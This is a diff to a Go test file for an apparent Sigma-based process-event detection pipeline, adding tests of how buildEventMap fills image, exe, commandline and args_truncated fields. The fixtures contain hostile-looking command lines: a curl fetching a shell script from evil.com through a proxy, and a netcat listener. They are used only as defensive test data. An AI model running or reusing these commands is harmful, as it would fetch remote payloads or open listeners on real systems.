@@ -100,7 +100,75 @@ func TestPipelineReportsOnlySigmaMatchedEvents(t *testing.T) {
 	if reported.GetSeverity() != "high" {
 		t.Fatalf("expected severity high, got %q", reported.GetSeverity())
 	}
-	if reported.GetMitreId() != "1059" {
-		t.Fatalf("expected mitre id 1059, got %q", reported.GetMitreId())
+	if reported.GetMitreId() != "T1059" {
+		t.Fatalf("expected mitre id T1059, got %q", reported.GetMitreId())
+	}
+}
+
+func TestBuildEventMapImageExeFields(t *testing.T) {
+	p := &Pipeline{
+		hostname: "test-host",
+		metrics:  monitor.NewMetrics(),
+	}
+
+	event := Event{
+		EventType:   "process_exec",
+		PID:         1234,
+		ProcessName: "curl",
+		CommandLine: "/usr/bin/curl -x socks5://proxy:1080 http://evil.com/shell.sh",
+		FilePath:    "/usr/bin/curl",
+	}
+
+	eventMap := p.buildEventMap(event)
+
+	if eventMap["image"] != "/usr/bin/curl" {
+		t.Errorf("image = %q, want %q", eventMap["image"], "/usr/bin/curl")
+	}
+	if eventMap["exe"] != "/usr/bin/curl" {
+		t.Errorf("exe = %q, want %q", eventMap["exe"], "/usr/bin/curl")
+	}
+	if eventMap["commandline"] != "/usr/bin/curl -x socks5://proxy:1080 http://evil.com/shell.sh" {
+		t.Errorf("commandline should contain full command, got %q", eventMap["commandline"])
+	}
+}
+
+func TestBuildEventMapExeFromCommandLine(t *testing.T) {
+	p := &Pipeline{
+		hostname: "test-host",
+		metrics:  monitor.NewMetrics(),
+	}
+
+	event := Event{
+		EventType:   "process_exec",
+		PID:         5678,
+		ProcessName: "bash",
+		CommandLine: "/bin/bash -c 'echo hello'",
+		FilePath:    "",
+	}
+
+	eventMap := p.buildEventMap(event)
+	if eventMap["image"] != "/bin/bash" {
+		t.Errorf("image = %q, want /bin/bash (from cmdline first token)", eventMap["image"])
+	}
+	if eventMap["exe"] != "/bin/bash" {
+		t.Errorf("exe = %q, want /bin/bash (from cmdline first token)", eventMap["exe"])
+	}
+}
+
+func TestBuildEventMapIncludesArgsTruncated(t *testing.T) {
+	p := &Pipeline{
+		hostname: "test-host",
+		metrics:  monitor.NewMetrics(),
+	}
+
+	eventMap := p.buildEventMap(Event{
+		EventType:     "process_exec",
+		ProcessName:   "nc",
+		CommandLine:   "nc -lvnp 1234",
+		ArgsTruncated: true,
+	})
+
+	if eventMap["args_truncated"] != true {
+		t.Fatalf("args_truncated = %v, want true", eventMap["args_truncated"])
 	}
 }
